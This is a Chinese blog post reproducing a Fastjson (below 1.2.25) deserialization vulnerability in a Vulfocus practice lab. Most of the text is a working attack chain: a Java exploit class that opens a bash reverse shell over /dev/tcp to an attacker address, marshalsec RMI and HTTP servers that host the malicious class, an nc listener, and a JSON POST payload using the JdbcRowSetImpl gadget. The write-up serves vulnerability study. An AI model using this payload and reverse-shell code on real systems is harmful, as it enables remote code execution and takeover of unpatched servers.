---
title: Fastjson 反序列化漏洞复现
description: 基于 Vulfocus 的 Fastjson（< 1.2.25）反序列化漏洞复现记录。
pubDate: 2026-05-03
tags:
  - CVE
  - Web安全
featured: true
draft: false
---

## 环境

- JDK: Java 8
- Fastjson: `< 1.2.25`
- 攻击机: `192.168.137.128`（Windows）
- 目标机: `192.168.137.131`（Linux）
- 服务机: `192.168.137.129`（Linux）

## 复现流程

我使用的是 Vulfocus 靶场环境。

![环境界面 1](/MyBlog/img/fastjson/1.png)
![环境界面 2](/MyBlog/img/fastjson/2.png)

需要使用 Java 8 编译该 EXP。JDK 可从 [OpenLogic](https://www.openlogic.com/) 下载。

## 反弹 Shell EXP

```java
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;

public class Exploit {
    public Exploit() throws Exception {
        Process p = Runtime.getRuntime().exec(new String[]{
            "/bin/bash",
            "-c",
            "exec 5<>/dev/tcp/192.168.137.128/666;cat <&5 | while read line; do $line 2>&5 >&5; done"
        });

        InputStream is = p.getInputStream();
        BufferedReader reader = new BufferedReader(new InputStreamReader(is));

        String line;
        while ((line = reader.readLine()) != null) {
            System.out.println(line);
        }

        p.waitFor();
        is.close();
        reader.close();
        p.destroy();
    }

    public static void main(String[] args) throws Exception {
    }
}
```

## 服务端准备

1. 在服务机启动 HTTP 服务（用于托管恶意类）：

```bash
python -m http.server 8888
```

![HTTP 服务](/MyBlog/img/fastjson/3.png)

2. 在服务机启动 RMI 服务：

```bash
/root/Desktop/jre1.8.0_491/bin/java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://192.168.137.129:8888/#reverse" 9999
```

![RMI 服务](/MyBlog/img/fastjson/4.png)

3. 在攻击机监听端口：

```bash
nc -lvp 666
```

## 发送请求

抓包后发送如下 POST 请求：

```http
POST / HTTP/1.1
Host: 192.168.137.131:16812
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 172

{
  "b": {
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "rmi://192.168.137.129:9999/reverse",
    "autoCommit": true
  }
}
```

![请求与结果](/MyBlog/img/fastjson/5.png)

## 图片访问说明

本文图片使用站点绝对路径：`/MyBlog/img/fastjson/*.png`。
部署到 GitHub Pages 后，可直接通过远程 URL 访问，例如：

- [https://wzy-most.github.io/MyBlog/img/fastjson/1.png](https://wzy-most.github.io/MyBlog/img/fastjson/1.png)
- [https://wzy-most.github.io/MyBlog/img/fastjson/2.png](https://wzy-most.github.io/MyBlog/img/fastjson/2.png)
